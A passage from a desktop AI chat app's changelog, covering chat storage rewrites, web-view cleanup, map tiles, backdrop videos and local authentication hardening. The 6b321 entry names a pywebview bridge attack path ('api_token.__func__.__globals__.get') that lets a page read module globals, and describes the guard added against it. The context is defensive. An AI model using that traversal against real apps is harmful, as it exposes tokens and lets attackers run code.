  (model, council, video, perf, voice, speeds, sky, skyhist, skynext,
  sbw); the old browser copy of the chats goes with them, and neither
  the page nor millenai.py names it. A choice made before prefs answer
  stands, and a lane opened meanwhile stays open: the Code tab opened
  early takes Coding without saving it and lands on the saved
  specialist once prefs arrive. Agent still resets at every boot.
- **The web view's clean-up (5.10, Q13, Q16)**, one routine with a
  branch per engine, started by the page (`POST /api/webstore/clean`)
  once the keys are handled, recorded in `profile.json` under
  `webstore` and run once:
  - the first pass: every data type from every site's record but the
    app's own, and from the app's own (127.0.0.1, localhost) every type
    but LocalStorage and cookies (the launch cookie; without it the
    reload gets the 403 page);
  - when this boot's page says none of the six is left in browser
    storage, the app's own LocalStorage too, one time, and the page
    reloads (Q13): a chats copy an old build left under another port
    goes with it, and the allow-listed conveniences (sky, sidebar width)
    reset once. A later boot that says otherwise withdraws an earlier
    request, so the Qt branch never acts on a stale one;
  - **macOS: not done.** The app runs as the venv's python3, so the
    default WebKit store is Python's (`org.python.python`), shared with
    every pywebview app that Python runs; the spec's
    `~/Library/WebKit/MillenAI` doesn't exist. The branch
    (`WKWebsiteDataStore` fetch and remove, on the main thread) is
    written but runs only when the process is the app's own bundle
    (`com.millen.millenai`), which is never true today. Until the window
    gets a data store of its own (a follow-up), the Mac has the page's
    sweep only: other sites' data, caches and other ports' LocalStorage
    (an old build's chats copy under 8889 included) stay;
  - Windows x64: `CoreWebView2Profile.ClearBrowsingDataAsync` on the
    window's WebView2, on its UI thread, with the kinds named (never
    cookies; local storage only for the one-time pass). pywebview 6.2.1's
    WinForms backend does honour `storage_path`, so its user-data folder
    is `app_dir()/webkit`;
  - Windows ARM64 (Qt): QtWebEngine has no per-origin removal, so the
    branch works on files at the next start, before the window opens and
    while no page holds them, and only in the copy holding the instance
    lock: everything in `app_dir()/webkit` but `Local Storage` for the
    first pass (cookies included: this run's launch cookie isn't set
    yet), `Local Storage` too once the page has asked. Anything that
    won't go leaves nothing recorded, so the next start tries again. The
    HTTP cache (`cachePath()`, which the storage path doesn't move) is
    cleared with `clearHttpCache()` on the Qt thread once the window loads.
  A branch that fails or can't run records nothing and never stands in
  the window's way; the next boot asks again. At most one reload per run.
- The cloud-key routes now turn cloud power on and off under
  `_prefs_lock` (`_set_turbo`), like every other settings write.
- Gauntlet (LOC-6, ISO-10's Phase 0 parts and the reviews): the legacy
  files (copies, nothing new reaches them, a final delete, eviction, trim
  and clear each leave them); the downgrade import (additions, new turns,
  a fresh id on collision, a diverged chat as a copy, removals and
  deleted ids never, nothing twice after a crash, nothing on the next
  start); a chat changed on both sides becoming one copy that follows
  the old build through two more turns and whose delete reaches
  `chats.json`; a failed write keeping its deletes, a failed legacy
  rewrite retried, and an old build's save in the middle of a rewrite
  kept; first writes, an unreadable `chats.json` shutting only the
  chats, an unreadable `memory.json` set aside with its bytes, a lost
  `profile.json` mapping and extending rather than copying, a cut-short
  copy made again; the clean-up's plan and branches (WebKit and WebView2
  against stand-ins, Qt on real files including one it can't remove),
  the own-bundle guard, a withdrawn request, and the route's once-only
  rule on a live copy (the `webstore-fake` hook records instead of
  needing a window); the page's own `storeBoot()` in node against a live
  copy (a failed first post, the next boot, prefs winning, a failed post
  keeping what prefs held, model kept, a change after first run coming
  back, the reload); the page's real `setTier`, `switchLane` and
  `setAgent` with prefs answering late (a mode picked early stands; the
  Code tab opened early lands on the saved specialist and never saves
  Coding over it); `storeBoot()` called at boot; the adopt route's
  rules on a fresh folder; Forget refusing when either .v2 file can't be
  read and emptying both legacy files; and LOC-6: the real build 275
  (from git, headless, on a fake home) run against a migrated folder
  lists neither a chat deleted here nor one made here and has no
  cleared fact; its added chat, its new turns, a chat under an id taken
  here and its fact are imported by the next start; a chat it cut stays
  in root; a delete followed by a crash (SIGKILL) is finished by the
  next start, which imports nothing; and 275 started again shows none
  of what left root. Updated: LOC-4 (the quit also takes the chat out of
  `chats.json` and puts its id in `gone`), the checks that read
  `chats.json` now read `chats.v2.json`, LOC-5 breaks the .v2 files, and
  the autonomy pin. Mutation-tested: 38 changes to the new code each
  fail at least one check, but one: taking the WebView2 purge from an
  earlier boot's request, which the withdrawal already rules out.
- Not verified here (no window may be opened): the WebView2 branch needs
  the x64 build on Windows and the Qt one the ARM64 build on Windows
  ARM64; ISO-10's windowed byte-grep of each store for a planted canary
  is Patrick's to run. The page's reload after the one-time purge and the
  first-boot moment before prefs answer (the composer shows Fast) are
  only seen in a window.

## 6b322 — chats stop getting lost: the server writes them (accounts step 4)
The spec's 0b ("stop losing chats"), minus the move to `.v2` files and
the browser-storage sweep, which are step 5. Before this the page saved
a question and its answer only when the stream ended and only for the
chat on screen, replaced the whole list on every save, and a read error
looked like an empty list that the next save wrote to disk.
- Reads never pass for empty (0b L1). `chats.json`, `memory.json` and
  `prefs.json` read as empty only when they aren't there; anything
  else raises StoreReadError, and every request is wrapped so that
  answers 503 with "Couldn't read your chats/memory/settings. Nothing
  was changed." The page shows the line and asks again every 3 s.
  `store_prefs` won't write over a settings file it can't read, so no
  caller can save settings built on an empty read.
- Every write is atomic: a unique temp file, fsync, `os.replace`.
  Memory keeps 200 facts (prompts still use 40). The chat store keeps
  every pinned chat, every chat with a `project` field (before Projects
  exists, so a downgrade can't evict one) and the newest 1,000 of the
  rest by `ts`; eviction makes no stub. Fields this build doesn't know
  are written back as read, at every level.
- The page sends operations to `POST /api/chats/ops`: create, append,
  truncate, set (title, pin, named, lane) and delete/undelete, each
  applied only onto the prefix or old value the page saw (SHA-256 of
  each message's role and text; page and server compute it alike). A
  mismatch makes a copy "‹title› (copy)" with the page's own content;
  a write to a deleted chat gets a fresh id. The whole-list
  `POST /api/chats` answers 410. Chat ids are "c" + 26 random base32.
- The server writes the turns: the question when `/api/chat` arrives,
  the answer when the stream ends, from the bytes it actually sent, by
  the page's own rule (only what follows the last RESET; the page's
  `streamText()` and the server's `turn_text()` run one corpus). A
  stopped answer keeps what was shown; an answer still streaming when
  the app quits is kept as far as it got; an answer that errored isn't
  saved and its question stays, for Try again. After each answer the
  page adopts the saved chat, so the two never hold different turns.
- The Funnel lane is saved the same way: the goal and each pick when
  they arrive, the summary at the end (it was never saved before).
- Try again and Edit & resend are truncates the next question waits
  for. Delete holds the chat on the server for the same 6 s as Undo;
  undo works once; a quit inside the window leaves it deleted.
- Viewing writes nothing: switching chats and New chat used to save the
  chat being left and move its stamp. A change counter (`data_rev`)
  rides the 2 s stats poll and the page re-reads the list when
  something else wrote.
- The page keeps no copy of the chats in browser storage any more.
- Every response is `Cache-Control: no-store`, and each request starts
  with the thread's leftovers from the last one cleared.
- Checked by hand in a browser against a dev copy: a chat saved and
  named, a follow-up, Try again replacing the answer in place, pin,
  delete and undo, a write from elsewhere picked up, switching chats
  leaving the file untouched, a whole funnel with its summary; and on
  the wire, a stopped answer (251 shown, 252 saved) and a quit mid-answer
  (202 shown, 202 saved).
- Gauntlet: LOC-1, 3, 4, 5, 7, 8 and 9 (LOC-6 and ISO-10 are step 5),
  the operations' rules, page/server hash and stream-rule twins, random
  ids, no-store and the thread-local reset.
- Three reviews (data loss, server robustness, page and tests) found,
  and this build fixes:
  - Try again under a finished funnel's summary truncated the whole
    funnel to nothing and started "Funnel: Funnel: …". A funnel is never
    rewound to its goal now, and every rewind (Try again, Edit & resend)
    is sent with the question it makes room for, so an abandoned edit
    leaves the saved chat alone.
  - A stopped answer the server hadn't noticed yet could be saved after
    the next question, into a "(copy)", or as a draft the page never
    showed. The server now settles a chat's streaming answer before its
    next question (and throws it away before a rewind); an answer it
    adds after the fact lands only where it belongs, in the chat or its
    undo copy, or not at all, never as a copy or a fresh chat; and a
    stopped stream's empty answer isn't rescued from a draft.
  - Deleting a chat mid-answer brought the answer back as an untitled
    chat; now it lands in the undo copy, and Undo re-reads the chat.
  - A 503 was streamed in as the answer: it shows as the error it is,
    and the question leaves the page's copy (nothing was saved).
  - Cmd+Q ended the process with exit(), skipping atexit: a streaming
    answer was lost, and the engines and the instance note were left.
    The app delegate's applicationWillTerminate: now does all three.
  - Forget and saving a cloud key with unreadable settings changed
    things before refusing; they now check first. A settings read that
    failed is marked, so it can never be saved even if the file reads
    again by then. A signal during the quit's own flush can't deadlock.
  - The namer renamed "(copy)" chats and gave up after a title conflict;
    copies are named, and a chat counts as named once its title lands.
  - A question whose answer failed stays in the chat but not in the
    model's context, where two questions in a row break templates that
    need turns to alternate.
  - Tests that could hang on a closed socket or pass without the thing
    they name (data_rev missing, memory's own chat failing, a quit
    outside the undo window, hash lengths away from the padding edges).
- Not covered by the gauntlet (it has no page driver): the page's own
  wiring of these calls, checked by hand in a browser instead, and
  Cmd+Q, checked once on a windowed copy (154 characters shown, 158
  saved).

## 6b323 — a place pin's location test reads the whole address
Seen in 6b322 and older than it: `/api/geo` returned Nominatim's
display_name cut to 80 characters, and `mountPlaces` kept a pin only
when that name contained the answer's location. A detailed address
reaches its city after character 80. Katz's is "Katz's Delicatessen,
205, East Houston Street, Manhattan Community Board 3, Manhattan, New
York County, New York, 10002, United States" (134 characters, checked
against Nominatim on 2026-09-27); cut, it ends "…Community Board 3,
Manh". With "New York", or "york" (what the CTX frame really sends: the
last word of the place terms), every pin dropped and the map hid.
- **The fix:** `_geocode` returns `full`, the uncut display_name, beside
  `name` (still cut to 80, for display). The page's test reads `full`,
  and so does the server's own MAP-pin test (`lt_ in …` in the chat
  handler), which had the same bug.
- **Why the whole name, not Nominatim's address fields:** a display_name
  runs from the venue out to the country, so the whole name only adds
  the tail: neighbourhood, city, county, state, country. Everything that
  pinned before still pins. Matching only the area fields
  (`addressdetails=1`) would be stricter, but it would drop a pin whose
  location is its street ("bars on broadway" sends "broadway"), and the
  key names vary by country.
- **The junk filter and 6b247 are unchanged:** a pin whose whole name
  lacks the location still drops, and a set wider than 250 km still
  hides the map. The cut also favoured the wrong pins, since a short
  name keeps its city inside 80 characters and a detailed one doesn't.
  In the gauntlet's canned case (Katz's plus York, England, location
  "york"), 50cfc77 dropped Katz's and drew England alone; now both
  match and the 250 km rule hides the pair.
- **What else reads `name`:** mapCard (the part before the first comma,
  for the Apple Maps link and the popup), osm_places (the same part,
  for the venue clock's place) and the fallback pin's popup in
  mountPlaces. None changed. The MAP frame now sends only lat, lon and
  name, so saved and synced chats don't gain the whole address.
  `_geo_cache` holds the new dict in memory only; nothing is on disk.
- Gauntlet: the real `_geocode` against a canned Nominatim (`name` still
  80, `full` whole), then the page's real `mountPlaces` in node: Katz's
  and Russ & Daughters pin for "york" while Brain (France) drops; "New
  York" pins Katz's; Katz's plus York, England hides; a lone junk pin
  shows no map. Also the server's test and the MAP frame's three
  fields. On 50cfc77 it fails the first three cases.
- Checked by hand: a dev copy's `/api/geo` against live Nominatim
  returned both fields for Katz's; in the browser pane (Chromium, hidden,
  so no basemap drew) the page's own addMsg put Katz's and Russ &
  Daughters on the map for "york"; Katz's plus Bettys (live, Harrogate,
  "…North Yorkshire…") hid it. Not checked: a real model answer end to
  end, and WKWebView (the change is one string test in the page).

## 6b322 — the maps draw again: OpenFreeMap's dark style
On 2026-09-27 CARTO started answering every tile request with a picture
reading "API KEY REQUIRED — carto.com/basemaps/apikey", with or without
a Referer, so every map in every build was blank grey. Patrick picked
the replacement from three (OpenFreeMap; CARTO's free key; Stadia's free
key), and chose to put the single-pin card on the same map.
- **Why OpenFreeMap:** no key, no account, no cap, commercial use
  allowed; its one condition is the credit line, "OpenFreeMap ©
  OpenMapTiles Data from OpenStreetMap". Nothing can leak from the
  public repo and no quota can run out. Ruled out: CARTO's key (free to
  5M/month, 1M commercial, but it would sit in the public repo), Stadia
  (key, non-commercial only, hard stop at 200k tiles; its no-key access
  from 127.0.0.1 is meant for development only), MapTiler (key, 5k
  sessions, non-commercial, logo), Esri (the old keyless
  services.arcgisonline.com tiles have been off-terms for open-source
  clients since April 2022), and OSM's own tile servers (they want a
  User-Agent that names the app, which a webview can't send, and they
  aren't dark).
- **How:** OpenFreeMap's tiles are vector, so MapLibre GL draws them
  inside Leaflet through the maplibre-gl-leaflet bridge; the pins,
  popups, fitBounds and the 250 km coherence rule are unchanged. The
  scripts are pinned (`leaflet@1.9.4`, `maplibre-gl@5.24.0`,
  `@maplibre/maplibre-gl-leaflet@0.1.4`) and still come from unpkg; the
  first map loads about 1 MB of MapLibre, cached after that. When item 7
  brings Leaflet local, these two come with it.
- **One GL canvas per map on screen.** A page keeps about sixteen WebGL
  contexts and drops the oldest past that, so a long chat of place
  answers would have blanked its early maps. `lmapNew` gives each map
  its basemap only while it's within 600 px of the chat's view
  (IntersectionObserver on `#chat-scroll`) and removes it, which frees
  the context, when it scrolls away or leaves the page; the Leaflet map
  and its pins stay. Maps that left the page are swept on the next mount.
- **The single-pin card** (`mapCard`, an answer with a MAP frame and no
  place list) was a light openstreetmap.org embed iframe; it is now the
  same dark Leaflet map at zoom 16 with one pin. Open in Maps moved to
  the top right, clear of the credit line, and its rule is `.mapcard>a`
  so Leaflet's zoom buttons and credit links don't take the pill style.
  If the map scripts can't load, the card hides, as the places map does.
  So does a machine with no WebGL: MapLibre throws, and pins on blank
  dark aren't a map, so the single-pin card hides and the places module
  keeps its card rail without the map.
- The credit line is dark (`.lmap .leaflet-control-attribution`), and
  `.lmap` isolates its stacking context so Leaflet's 400-1000 z-indexes
  stay under the pill.
- Gauntlet: no CARTO, no tile layer, no OSM embed; the style URL, the
  three credits and the pinned scripts; no key of any kind in the map
  code; the visibility observer and the layer removal; both mounts go
  through `lmapNew`. The attribute-escaping check now expects the card's
  map div and Apple Maps link instead of the iframe.
- Checked by hand: a dev copy in the browser pane (Chromium) drew both
  maps dark with the credit line, a new city in about 1.6 s; with twenty
  maps in one chat only the four or six near the view held a canvas, and
  clearing the chat freed them all; with MapLibre made to throw, both
  maps hid as above. In WKWebView (a pywebview window on this Mac, same
  pinned scripts) MapLibre ran on WebGL2 and the style drew 545 street,
  building and water features in about 2 s. Not checked: WebView2 and Qt
  on Windows. A hidden window (or browser pane) draws nothing until
  shown, since the observer and MapLibre both wait for rendering.
- Seen, not fixed: `/api/geo` returns Nominatim's name cut to 80
  characters, and `mountPlaces` keeps a pin only when that name contains
  the answer's location. "Katz's Delicatessen" with location "New York"
  comes back as "…, Manhattan Community Board 3, Manh", fails the test,
  and the places map hides; with "Manhattan" it draws. That predates
  this change. Fixed in 6b323.

## 6b323 — backdrops: variety in short sessions, day and night kept apart
Patrick, 2026-09-27: "still getting the same few background videos.
earth or sometimes nyc skyline. sometimes jellyfish. never anything
else." His shelf held 8 clips: 6 night ones (earth from space at night,
the New York night skyline, jellyfish and other undersea clips) and 2
daytime ones. A clip is 200-550 MB and arrives at about 5 MB/s, a minute
each, while the app is open; his sessions are shorter than that.
- The stocking picked a new random clip every session, so a half
  downloaded one was left behind (one sat at 22 MB for a day) and short
  sessions finished nothing. Now a half-done clip is finished first.
- On a tie between the kinds the stocking always chose the night clips,
  and one shelf of 8 let them push the day clips out. The shelf now
  keeps 8 of EACH kind (16 clips, about 4.5 GB), evicts within a kind,
  and a tie goes by clips on the shelf, then the kind showing now.
- The history of seen clips lived only in the window's storage, which
  came back nearly empty on his Mac (two entries), so every clip on the
  shelf counted as new. It is now also kept beside the clips
  (sky/hist.json, via POST /api/sky/seen) and merged at launch.
- Measured with the page's own functions, 400 launches of short
  sessions (a third of a clip each): a clip back within five daytime
  launches went from 85 to 5, clips of the wrong kind for the hour
  from 202 to 0, daytime clips seen from 26 to 56. The gauntlet's
  simulation now models those short sessions; it used to let every
  launch finish all its downloads, which is why it passed.

## 6b321 — an API token, a one-time boot code, media behind the token (accounts step 3)
Until now the launch cookie was the only credential: anything that got
it (a copied cookie, a replay from another local port) opened every
chat, and `/?key=` took the key itself for the whole launch, so any copy
of that URL was a working key. This is 0a item 4 (5.4), section 9's
static-file and navigation recommendations, ISO-14, and M3 of the
sign-in plan.
- `API_TOKEN` (32 random bytes, `secrets.token_urlsafe(32)`) is made at
  import beside `ACCESS_KEY`. `_gate` now runs: Host, proxy headers,
  the boot exchange, the cookie, then `X-Api-Token` (compare_digest on
  bytes) on everything but what the cookie alone opens.
- What the cookie alone opens is one allow-list, `_COOKIE_ONLY`: GET of
  exactly `/` (the page), `/static/sky/<n>.mov` (Apple's public backdrop
  clips) and `/static/vfx/hdr-beacon.mp4` (the unused HDR beacon, kept
  as its 6b264 comment asks). A `<video src>` can't send a header and
  the clips stream by Range, so they can't go through the token. Nothing
  there is personal. Everything else, every `/api/*` route and any route
  added later outside `/api`, needs the token as well; allow-listing
  means an absolute-form or `//api` path can't slip past a prefix test.
  `/sky/` and `/vfx/` moved under `/static/`; fonts and Leaflet join
  them when item 7 brings them local. A clip number past the list is a
  404 (it raised IndexError and dropped the connection).
- `/?key=` is gone. The window opens `/?boot=<code>`: a one-time code
  minted just before `create_window` (after the engines start, so they
  don't eat its 60 s). It sets the same `millen_key_<port>` cookie
  (HttpOnly, SameSite=Strict, Path=/) and 302s to `/`, once; it dies
  after one use or 60 s. A wrong guess doesn't burn it, so another local
  process can't strand the window. A reload of the boot URL with the
  cookie just goes home. If the window still sits on `/?boot=` after a
  load (a cold start slower than 60 s), `_boot_heal` loads a fresh code,
  twice at most. The page is served at exactly `/`: `/?anything` is a
  403 with the cookie alone.
- The token reaches the window through pywebview's js_api:
  `_WindowBridge`, with one public method, `api_token()`, which answers
  only while the window's URL is `http://127.0.0.1:<port>`. pywebview's
  own `js_bridge_call` resolves a name one getattr at a time, dunders
  included, and pastes the reply id into a script unescaped: with any
  js_api at all, a page (on macOS any frame, the map's OpenStreetMap
  iframe too) could post `api_token.__func__.__globals__.get` and read
  or write this module's globals, or run script through the id.
  `_bridge_guard` wraps it right after `import webview`, before any
  backend module binds the name, and lets through only `api_token` with
  no arguments and a plain id. If the guard can't be installed the
  window opens without js_api (and says so) rather than with the bridge
  open.
- The page: one wrapper, `api()`, is the only fetch (the 109 `fetch(`
  sites became `api(`). It waits for the token (pywebviewready, or the
  bridge already there; on Qt only once its channel is up), asks again
  if a reply is lost, adds `X-Api-Token` to same-origin `/api/` calls
  only, passes everything else through, and returns the Response itself,
  so the chat's streamed read works. A Stop while waiting aborts as
  fetch would. It never proceeds without the token: after 20 s it shows
  "ConcordeAI's window didn't finish starting" and keeps waiting.
- Media: renderMD writes `data-api-src`, never a src at `/api/`. A
  MutationObserver loads each picture and video through `api()` as a
  `blob:` URL, one per path, so the stream's many repaints take the
  cached URL before they paint (no refetch, no flicker); off-screen ones
  wait for an IntersectionObserver, as loading=lazy did; blobs nothing
  shows any more are freed about 20 s later. The download box is a
  button (an `<a href>` can't carry the token, and a middle-click saved
  the 403): Finder reveal first on a Mac, else `apiDownload` fetches and
  saves a `blob:` URL, which on a PC is every save.
- New pictures and videos are named `secrets.token_hex(16)` (one helper,
  `_media_id`, at all four sites); old `<unix time>-<6 hex>` names are
  still served, behind the token.
- The page carries nothing personal: the hero's first name and home
  town came from prefs into the HTML (`__USER_NICK__`,
  `__USER_CITY__`), which the cookie alone opens. They now come from
  `/api/prefs`; the greeting draws at once and rises in again with the
  name when it arrives. `SKY_NIGHT` (one bit) stays.
- `run/instance.json` (0600) carries the token beside the port, key and
  pid, never the boot code. The second-launch hand-off sends key and
  token to `/api/window/focus`, which refuses either alone. ci_smoke.sh,
  drill.py and CLAUDE.md's recipe read and send the token; ci_smoke
  also checks that the cookie alone gets 403 on `/api/stats` and that
  the page holds neither the key nor the token.
- Test hooks (dev copies only): `boot-code` has a windowless copy write
  a boot code to `run/boot.json` (0600); `boot-short` gives it 2 s.
- Gauntlet: `req()` sends the token by default (`token=False` for the
  page, `/static/` and door checks). New: the boot code (a wrong guess,
  one use, flags, no-store; 60 s on a fake clock and live on a 2 s copy),
  `/?key=` 403 with and without the cookie, the token on every /api call
  (cookie alone, token alone, wrong token, token in the query or a
  cookie), cookie replay over every route the handler names (GET and
  text/plain POST, 403 with the gate's own body), absolute-form and
  `//` paths, `/static/` traversal and the clip bound, media old and new
  behind the token (and Range), the page with a canary name and town set
  holding neither nor the key or token, the focus route, the two-copy
  checks with one credential swapped at a time, a boot code refused by
  the other copy, a guessed old media id, the token only in
  `run/instance.json`, the hand-off with and without the token, 32-hex
  media names, the bridge guard (against pywebview's real function), the
  one-method js_api and its origin check, the one-fetch page gate
  (tokenized), and `api()` itself in node (waits, headers, abort,
  streaming Response, Qt, a null bridge, the blob cache). Rewritten:
  the `/?key=` link check, the focus check, the window-URL pin, the two
  `fetch(` pins, the renderMD corpus (data-api-src), the hero's name and
  town, and the clip and beacon paths. Baseline 284 becomes 301. Nine
  mutations of the server (the token skipped on GETs, a boot code never
  spent, a wrong guess that burns it, the `/?` page catch-all back, the
  name in the page, no clip bound, pictures on the cookie alone, a
  cookie without HttpOnly, a prefix-only token compare) each fail at
  least one new check.
- Only a real window can confirm: the token arriving through js_api on
  WKWebView, WebView2 and Qt; the first calls waiting for the load (the
  Google Fonts stylesheet is part of it); `blob:` video playback and
  `blob:` downloads through pywebview's download path; the greeting's
  second draw; `_boot_heal`.
- Checked by hand after the build: a windowed dev copy on this Mac
  (WKWebView) booted through `/?boot=`, got its token over js_api and
  drew its chats, meters and engine chip with no "didn't finish
  starting" notice. In a browser with the bridge stood in: nothing ran
  before the token came, then the chat list loaded, a streamed answer
  arrived whole, a picture loaded as a `blob:` (and its route gave 403
  to the cookie alone), and Settings drew About, Models and Account.
  Still unconfirmed: WebView2 and Qt (the Windows VM), `blob:` video
  and downloads.
- pywebview is pinned to 6.2.1 in all three installers (the Windows
  launcher's setup marker becomes `deps-3`, so a PC reinstalls once).
  The bridge guard wraps a pywebview internal; a later pywebview that
  moved it would leave the window without its token, so a new version
  comes in on purpose, with the guard and its check updated together.

## 6b320 — the web version is gone (accounts step 2)
Patrick approved deleting the old web version for good on 2026-09-26;
its hosting was shut down on 2026-09-24. Its code stayed behind the
launch key since 6b310, but it still made per-visitor `users/` folders
and still answered keyed requests that carried a proxy header. One
tenancy (this computer's own folder) has to be the only one before the
profiles and sign-in arrive. This is 0a items 3 and 8 (5.3 and 5.8) and
M2 of the sign-in plan.
- Deleted: the sign-in door (`WELCOME_PAGE`), `/api/welcome`,
  `/api/guest`, `/auth/google` and its callback, `google_conf`, the
  owner PIN (`owner_pin`, `owner_uid`), `_user_id`, `_write_ident`,
  `_uid`, `_set_user_cookie`, the `millen_user` cookie, `_remote()`
  (the only place `X-Forwarded-For` or `Cf-Connecting-Ip` was read),
  `ADMIN_PATHS` and `_admin_gate`, the guest ladders (`guest=` on
  `work_ladder`, `fast_cloud_ladder`, `vision_ladder` and
  `run_council`, `paid=` on `generate_image`), the chat handler's guest
  branch and its stale "free community service" comment, the Remote
  agent's "not over the web" refusal, `_purge_stale_guests`,
  `_last_seen` and the visitor counts on `/api/stats`, and the web-only
  "get the app" chip (`/api/downloads`, `download_links`, `#get-app`,
  the download-help veil).
- `_data_base()` keeps its 17 call sites and returns None (the app's
  folder) whatever the request carries, so a forged cookie reads the
  root and makes no folder.
- Nothing reaches the app through a proxy (ISO-14): `_gate` refuses any
  request carrying a forwarding header (`X-Forwarded-For`, `Forwarded`,
  `X-Real-IP`, `Cf-Connecting-Ip`, `True-Client-IP`,
  `X-Forwarded-Host`) with 403, key or no key. The window never sends
  one, so a tunnel pointed at the port again gets nothing. `sweep_all_exports`
  no longer walks `users/`; a leftover `users/` on an old machine is
  never touched by the app.
- Kept: `_gate` with its Host check, the `millen_key_<port>` cookie and
  `/?key=` (it goes with the boot code in step 3); `_csrf_ok`, whose
  Host check now runs on every write; the `/api/me` shape (it answers
  `{"kind": "owner"}`); the Account pane, which shows only the local
  card; Forget Me and its three scopes, without the PIN field, and
  each store is emptied in place (the web profiles' whole-folder erase
  went); and `/api/logout`, a stub that answers ok and touches no
  cookie until the desktop sign-out exists.
- The page: `IS_LOCAL` went. `_gate` only serves the page at
  127.0.0.1 or localhost, so it was always true in the window and
  nothing the owner sees changes. The Account pane's description no
  longer talks about signing in elsewhere or signing out, and the Zito
  board reads "profiles 1".
- Browser mode is gone (5.3). A launch without pywebview, or on a PC
  without the WebView2 Runtime, says what it needs and exits with code
  4 before it takes the lock, runs the start-up scrub or binds a port.
  On a PC the desktop app also shows it in a message box, since pythonw
  has no console. The native ARM64 build draws with Qt, so it skips the
  WebView2 check. The second-launch hand-off only brings the window
  forward: it no longer reopens `/?key=` in the default browser, which
  put the key in the browser's history and the cookie on every
  127.0.0.1 port. The one `webbrowser.open` left is the PC update's
  GitHub page.
- `/api/workspace/set` (and `/api/workspace/off`) are POSTs; a GET
  answers 405 and changes nothing. The Workspace "Use" button posts.
- go-live.sh is deleted, release.sh no longer runs the live copy's
  updater, and the sibling check no longer probes 9889.
- Gauntlet: 13 checks retired, all of them web-version behaviour: the
  sign-in door and its styling (3), the guest pass, PIN and fresh
  profile checks (4), the "no owner_pin" remote PIN (1; its owner-PIN
  twin never ran), and "remote blocked" on five admin routes (5), which
  would now run those routes for real. Rewritten in place for the
  local-only shape: the guest-video check (now the Veo daily cap), the
  ladder and council pins, the logout stub, the full forget (stores
  emptied in place, no rmtree, no PIN), the stats (no visitor counts),
  the Account pane (only the local card, no PIN field), the WebView2
  check (a detector with no box, the ARM64 build skipped, and the
  window check before the lock and the port), and seven checks that
  pinned a removed string. New: one identity (a forged `millen_user` reads the root, gets
  the app and makes no `users/`, and each forwarding header gets 403 on
  GET, POST and `/` even with the key); ISO-18's app half
  (a scan for every web-version name, and the old routes answer 404
  with no cookie); browser mode gone (a dev copy with the no-webview
  hook and 9903 held exits 4 with the install line, makes no `run/`,
  and a stand-in webbrowser module records nothing); and the Workspace
  POST (a GET answers 405 and changes nothing). Each new check was run
  against the step-1 code and fails there. Baseline 293 becomes 284.
- `SMOKE_NO_REAL=1` leaves the real data folder unread (the one check
  that byte-greps it says SKIP), for runs by someone who must not open
  its files.
- Patrick's own steps, unchanged by this build: delete
  `~/Library/MillenAI-live`, the four plists in
  `~/Library/LaunchAgents/disabled/`, the ai.* ingress in the
  cloudflared config (and its 2026-09-24 backup), the
  ai.millertechnology.net DNS record and tunnel route, the "MillenAI
  Web" OAuth client, and the Trash holding `users/`,
  `google_oauth.json` and `owner_pin`.

## 6b319 — dev and test copies live in their own folder (accounts, step 1)
Sign-in and sync come first (Patrick, 2026-09-26), and they can't be
tested while a dev copy shares the real data folder: account tests would
plant accounts and keys in real data, and run a second sync engine on
it. This is 0a item 2 and harness step 1 of the accounts specs.
- A dev or test copy is `MILLENAI_DEV=1` plus a `MILLENAI_HOME` folder,
  and everything it keeps (chats, prefs, keys, logs, the instance lock)
  lives there. Either one alone, or a folder that is the real one,
  inside it or around it, exits with code 2 before anything binds. A
  second copy on the same folder exits with code 3.
- Every launch makes its own random key (no more `MILLENAI_KEY`, and no
  fixed key in CLAUDE.md) and writes port, key and pid to
  `run/instance.json` (0600) in its folder.
- `MILLENAI_NOWINDOW` replaces `MILLENAI_HEADLESS`, dev copies only.
  `MILLENAI_TEST_HOOKS` (first hook: `no-webview`) and
  `MILLENAI_SYNC_URL` are honoured only in a dev copy, so none of them
  can reach the app a person opened. The port no longer changes
  behaviour.
- A dev copy no longer gets a plaintext `cloud-dev-<port>.json` copy of
  the real keys; it starts with none. The real app's boot sweep already
  removes old copies once their port is free and they're an hour old.
- The gauntlet starts its own copies on 9901 and 9902, each in a
  temporary folder, and stops and deletes them at the end. New checks:
  two copies never see each other's chats or keys (a canary chat, with
  a byte-grep of the other copy's folder), the real folder gains no
  file and no canary, every half-set launch refuses (run against a fake
  home directory, so a broken guard couldn't reach the real folder),
  and the test switches do nothing outside a dev copy.
- ci_smoke.sh, drill.py, CLAUDE.md and DRILL_LOOP.md start dev copies
  the new way; sync/selftest.py moved off 8799 (the accounts harness's
  proxy port).
- Any other `MILLENAI_` setting is refused too (code 2), so the old dev
  recipe (fixed key, headless switch) can't quietly start the real app
  on the real folder. SIGTERM now removes the copy's own
  `run/instance.json`, so a restart never reads a dead copy's key.
- A three-lens review (real app, isolation, tests) confirmed 13 findings,
  all in the tests and tooling; all fixed. The real-folder check now
  fails on any new file and greps the whole folder and the log folder;
  each refusal must give its own reason while 9903 is held open (so a
  copy that bound first would exit 1, not 2); a second copy on one
  folder exits 3; the Windows crash and pythonw logs follow the dev
  folder; and the gauntlet stops a copy with SIGTERM to the app alone,
  so an engine the desktop app took over is never killed mid-answer.
- Not in this step: the recording proxy on 8799 comes with the first
  test that needs it (the cloud-switch checks, step 6), and
  `/?key=` goes with the boot code (step 3).

## 6b318 — backdrops that don't repeat, and go dark after dark

Per Patrick: "the background videos always seem to cycle the same ones
over and over. When there's tons of them it can pick from." There are
89 clips; five are New York, and half of all launches drew from those
five (each allowed back three launches later), so one of the same five
showed every other launch. The clip readied for next time also leaned
New York half the time and only skipped the last six seen, and a launch
with nothing fresh on disk replayed a random recent clip. His Mac's
history bore it out: 3 of the last 5 were New York.
- Then, per Patrick: "no need to bias towards nyc anymore - lets favor
  variety. if possible, use darker videos at night", and "use
  sunrise/sunset if it helps". The New York lean is gone. The server
  works out the sun's height where you are (the home area once it has
  been geocoded, else the time zone's own city from zone.tab, else a
  longitude from the UTC offset) and tells the page SKY_NIGHT: from
  about 20 minutes after sunset (-4 degrees) to 20 before sunrise the
  23 dark clips play (the night passes, the aurora, the deep dives), by
  day the other 66. Within that: a clip not seen in the last 32, from
  disk; else the cached one of the right kind seen longest ago; never a
  wait while anything is cached. The shelf now counts UNSEEN clips and
  keeps two of each kind (counting spares had stopped at one fresh
  clip, often of the wrong kind, so a morning replayed a recent one).
  skyPick and skyStockPick are pure; the gauntlet runs 340 launches,
  four in ten at night: no clip back within ten launches (was 20%),
  no clip of the wrong kind, New York at its natural ~6% (was 42%),
  46 different clips in 50 launches (was 31); the sun is checked
  against known sunsets, a noon and the midnight sun.
